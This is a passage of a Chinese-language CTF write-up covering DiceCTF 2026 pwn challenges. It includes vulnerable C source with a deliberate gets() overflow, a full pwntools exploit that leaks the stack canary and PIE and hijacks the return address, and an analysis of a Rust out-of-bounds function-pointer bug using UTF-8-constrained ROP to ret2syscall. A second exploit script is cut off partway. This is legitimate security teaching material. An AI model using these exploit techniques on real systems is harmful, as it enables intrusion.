+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">rate</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid crush rate, using default of 1.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">rate</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter output length:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">output_len</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">output_len</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">output_len</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">crushed</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Output length too large, using max size.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">output_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">crushed</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nf">crush_string</span><span class="p">(</span><span class="n">input_buf</span><span class="p">,</span> <span class="n">crushed</span><span class="p">,</span> <span class="n">rate</span><span class="p">,</span> <span class="n">output_len</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Crushed string:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="n">crushed</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get_feedback</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter some text:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Your feedback has been recorded and totally not thrown away.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define COMPILE_ADMIN_MODE 0
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Welcome to ByteCrusher, dicegang&#39;s new proprietary text crusher!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;We are happy to offer sixteen free trials of our premium service.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">free_trial</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">get_feedback</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Thank you for trying ByteCrusher! We hope you enjoyed it.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">COMPILE_ADMIN_MODE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">admin_portal</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有越界写，通过选择合适的 rates 可以逐字节泄露 canary 和 pie ，毕竟至少有 16 字节的泄露机会</p>
+<p>然后在栈溢出上 ret2text 即可</p>
+<p>比较棘手的是本地打需要 Piggyback 技巧，但打远端不用</p>
+<p>这比赛还有个神秘的 PoW ，爆破什么的不大现实</p>
+<h3 id="ida">IDA
+</h3><h4 id="free_trial">free_trial
+</h4><p><img alt="这是什么鸭" class="gallery-image" data-flex-basis="154px" data-flex-grow="64" height="783" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/bytecrusher/free_trial.png" width="503"></p>
+<h4 id="get_feedback">get_feedback
+</h4><p><img alt="这是什么鸭" class="gallery-image" data-flex-basis="703px" data-flex-grow="293" height="223" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/bytecrusher/get_feedback.png" width="654"></p>
+<h3 id="exp">exp
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">debug</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./bytecrusher_patched&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;bytecrusher.chals.dicec.tf&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">canary_rates</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">pie_rates</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">crush</span><span class="p">(</span><span class="n">rate</span><span class="p">,</span> <span class="n">output_len</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;crush:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;rate:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">rate</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;length:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">output_len</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">attack</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="n">canary</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">canary_rates</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">crush</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;string:</span><span class="se">\n</span><span class="s2">A&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="n">canary</span> <span class="o">+=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;canary = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">pie</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">pie_rates</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">crush</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;string:</span><span class="se">\n</span><span class="s2">A&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="n">pie</span> <span class="o">+=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pie</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">pie</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x15EC</span>
+</span></span><span class="line"><span class="cl">	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;pie = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">pie</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="n">crush</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pie</span> <span class="o">+</span> <span class="mh">0x12AD</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;text:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;proof of work:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pow_cmd</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;solution: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">pow_cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">attack</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="message-store">message-store
+</h2><h3 id="checksec-1">checksec
+</h3><p><img alt="这是什么鸭" class="gallery-image" data-flex-basis="642px" data-flex-grow="267" height="224" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/message-store/checksec.png" width="600"></p>
+<h3 id="ida-1">IDA
+</h3><h4 id="main">main
+</h4><p><img alt="这是什么鸭" class="gallery-image" data-flex-basis="168px" data-flex-grow="70" height="1240" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/message-store/main.png" width="868"></p>
+<p>入口</p>
+<h4 id="set_message">set_message
+</h4><p><img alt="这是什么鸭" class="gallery-image" data-flex-basis="394px" data-flex-grow="164" height="525" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/message-store/set_message.png" width="864"></p>
+<p>允许写入 BUFFER</p>
+<h4 id="set_message_color">set_message_color
+</h4><p><img alt="这是什么鸭" class="gallery-image" data-flex-basis="426px" data-flex-grow="177" height="393" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/message-store/set_message_color.png" width="699"></p>
+<p>设置 color</p>
+<h4 id="print_message">print_message
+</h4><p><img alt="这是什么鸭" class="gallery-image" data-flex-basis="400px" data-flex-grow="166" height="624" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/message-store/print_message.png" width="1041"></p>
+<p>没有校验 COLOR 的大小，存在数组越界写，可以执行函数指针，只要提前往 BUFFER 写入即可</p>
+<p>需要注意 from_utf8_lossy</p>
+<h4 id="from_utf8_lossy">from_utf8_lossy
+</h4><p>from_utf8_lossy 是 Rust 标准库中用于处理可能包含无效 UTF-8 序列的字节数据‌ 的方法，其核心特点是 ‌“有损但保证成功”‌</p>
+<p>from_utf8_lossy ‌行为‌：
+若字节序列是有效 UTF-8‌ ，直接借用为 &amp;str ，不分配内存‌
+若遇到无效 UTF-8 字节‌，用 Unicode 替换字符 ‌�（U+FFFD）替换，并返回一个‌新分配的 String‌</p>
+<h4 id="buffer">BUFFER
+</h4><p><img alt="这是什么鸭" class="gallery-image" data-flex-basis="1037px" data-flex-grow="432" height="237" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/message-store/BUFFER1.png" width="1025"></p>
+<p><img alt="这是什么鸭" class="gallery-image" data-flex-basis="411px" data-flex-grow="171" height="611" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://pic.ratherhard.com/post/contest/DiceCTF-2026-Quals/message-store/BUFFER2.png" width="1047"></p>
+<h3 id="攻击思路">攻击思路
+</h3><p>利用数组越界写执行函数指针，由于 rax 在执行函数指针时为 from_utf8_lossy 的返回值，结合 <code>xchg rsp, rax; ret;</code> 可以去执行 BUFFER 上布置的 ROP 链，</p>
+<p>但是这需要使 BUFFER 上布置的 ROP 链所使用的字节满足 UTF-8 规范：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1字节：
+</span></span><span class="line"><span class="cl">00–7F
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2字节：
+</span></span><span class="line"><span class="cl">C2–DF 80–BF
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3字节：
+</span></span><span class="line"><span class="cl">E0 A0–BF 80–BF
+</span></span><span class="line"><span class="cl">E1–EC 80–BF 80–BF
+</span></span><span class="line"><span class="cl">ED 80–9F 80–BF
+</span></span><span class="line"><span class="cl">EE–EF 80–BF 80–BF
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">4字节：
+</span></span><span class="line"><span class="cl">F0 90–BF 80–BF 80–BF
+</span></span><span class="line"><span class="cl">F1–F3 80–BF 80–BF 80–BF
+</span></span><span class="line"><span class="cl">F4 80–8F 80–BF 80–BF
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后去筛选 gadgets 打 ret2syscall</p>
+<p>不过中间还需要布置 /bin/sh ，在 BUFFER 上布置然后传给 rdi 的地址不可能满足 1 字节 UTF-8 规范，但是可以满足 2 字节 UTF-8 规范： 0x2F9FD0 （小端序）</p>
+<p>rust pwn 直接逆向比较困难，结合 动态分析 / fuzz 去推测漏洞点是很好的技巧</p>
+<h3 id="exp-1">exp
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">debug</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./challenge&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span> <span class="mi">26980</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_message</span><span class="p">(</span><span class="n">meesage</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;New Message? &#39;</span><span class="p">,</span> <span class="n">meesage</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_message_color</span><span class="p">(</span><span class="n">color</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">color</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">print_message</span><span class="p">():</span>
